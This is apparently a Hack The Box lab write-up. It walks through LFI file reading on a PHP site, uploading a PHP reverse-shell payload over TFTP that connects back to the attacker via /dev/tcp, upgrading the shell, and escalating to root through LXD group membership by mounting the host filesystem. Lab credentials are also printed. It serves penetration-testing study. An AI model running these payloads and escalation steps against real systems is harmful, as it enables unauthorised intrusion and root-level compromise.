---
tags:
  - Linux
  - HTTP
  - LFI
  - TFTP
  - PHP
  - LXD
---

... is a simple HTB machine where a `http` service has an LFI vulnerability which reveals the credentials for a user (although, no `ssh`). The `/etc/passwd` shows a service account for `tftp`, which allows you to upload a malicious `php` file which can be executed using the LFI. For privilege escalation, the user is allowed to start containers. The container image can be mapped to the local file system, which can then be accessed as `root`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
The web site on port `80` shows an page which is for `Titan Gears`. It is mostly filled with `Lorem Ipsum` text, and has nothing hidden in the `HTML` source, nor the debugger tabs.

### Initial Exploitation
It is interesting however, that an `GET` parameter in the URL is used. It is used to display the page using `http://$IP/?file=home.php`. I test if i can view the `/etc/passwd` file using `http://$IP/?file=/etc/passwd`, and it works! I can view files on the targets file-system using this parameter. I also tried to include a remote file by starting a server using `python3 -m http.server`, but that did not work.

This `/etc/passwd` file is hard to read in the browser so use `curl http://$IP/?file=/etc/passwd` to read it. The last entry in this list is `tftp`. This abbreviation usually stands for `Trivial File Transfer Protocol`. A quick google search reveals that this service is reachable via the `UDP` port `69`. I can try interacting with this service, as my standard `nmap` scan did not scan `UDP` ports.

But first i want to find every interesting file on that file-system to gain more information. To do so, i download the word-list `Fuzzing/LFI/Linux/LFI-gracefulsecurity-linux.txt` from the [SecLists github](https://github.com/danielmiessler/SecLists). To fuzz using this word-list, i use the following `ffuf` command, as that tools seems to be the fastest:
```bash
ffuf -w ./LFI-gracefulsecurity-linux.txt -u "http://$IP/?file=FUZZ" -fs 0 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 0 indicate no file
# -mc: accept any response code
```

This gave me a lot of files which i can view. The server for the `http` service has been identified to be `apache2`, but the configuration files do not reveal any big secrets.
I also used tried fuzzing this vulnerability using another word-list `Fuzzing/LFI/LFI-Jhaddix.txt`, and this word-list has found a file on the URL `http://$IP/?file=.htpasswd`! This file holds the credentials `mike:Sheffield19`! Sadly i cannot use them anywhere right now.

Due to the `tftp` user within the `/etc/passwd` of the server, i use the command `tftp $IP` to initiate a connection. Sadly, `tftp` does not provide an option to list the files in the directory. I can only `get` files which are in the directory of `tftp`, or `put` files there. I prepare the following `php` payload (i know that it's `php`, due to the default page being `home.php`):
```php
<?php system('bash -c "/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1"'); ?>
```
When this file gets rendered on a browser, it executes server sides and initiates a reverse shell onto my system. To render it, a quick google search reveals that the directory of `tftp` files is usually `/var/lib/tftpboot`. So i start the listener:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

... and initiate the reverse shell using `curl http://$IP/?file=/var/lib/tftpboot/evil.php`. This worked!

I cannot read the flag located in `/home/mike/user.txt`, as i do not have the permission to do so. I neither can not use `su` to switch to the user `mike`, as `su: must be run from a terminal`. This is why i use [this neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to upgrade my shell:
```bash
# within reverse shell:
python -c 'import pty; pty.spawn("/bin/bash")'
# background the process using CTRL-Z
stty raw -echo && fg
# press enter twice!
export SHELL=bash
export TERM=xterm-256color
stty rows 100 columns 100
```

This gives me the capability to use `su mike` by providing his password! I can then use his password which i got from the `.htpasswd` to authenticate as him and read the flag.

### Privilege Escalation
I try the usual suspects of privilege escalation:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

And the `id` command has shown me something unusual. The user `mike` belongs to the `lxd` group. A google search reveals that users in the `lxd` group are allowed to manage containers, VMs and the underlying hypervisor. Even a page on the [HackTricks wiki](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html) exists for this privilege escalation vector.

For this to work, the two files `lxd.tar.xz` and `rootfs.squashfs` are required. They can be found on the [official LXD images](https://images.lxd.canonical.com/) page. As i am not allowed to reach the internet via the HTB machine, i download these two files on to my local machine and move them to the machine using `python3 -m http.server 1337` as the server and `curl -O http://<my-ip>:1337/lxd.tar.xz` as the command from the target.

After this was successful and the files are present, the following commands (taken from `HackTricks`) can be used in succession to gain code execution as `root`:

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# creates an image using the two files with the alias "alpine"
```

```
lxc init alpine privesc -c security.privileged=true
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# initiate the container "privesc" with the "alpine" image. security.privileged=true means that "root" in the container is "root" on the host
```

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# configure the container to mount to the host filesystem
```

```bash
lxc start privesc
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# start the container
```

```bash
lxc exec privesc /bin/sh
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# execute the command /bin/sh (start a shell in the container)
```

```bash
cd /mnt/root
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# this gives you access to the host filesystem as root, where the flag can be read!
```

### Summary

Below is a visualized summary of the exploitation steps used in this machine.

``` mermaid
graph LR
  A[HTTP<br>service] -->|LFI| B[passwd file];
  A[HTTP<br>service] -->|LFI| C[.htpasswd file];
  B -->|Reveals| D[TFTP<br>service];
  
  E[TFTP<br>service] -->|Upload| F[PHP-code];
  A -->|Access via<br>LFI| F;

  F --> G[PHP-code<br>execution];
  C -->|switch user| H[Terminal<br>access];
  G -->|switch user| H[Terminal<br>access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[Terminal<br>access] -->|Belongs to| B[lxd Group];
  B -->|create<br>privileged<br>container| D[Command<br>execution<br>as root];
```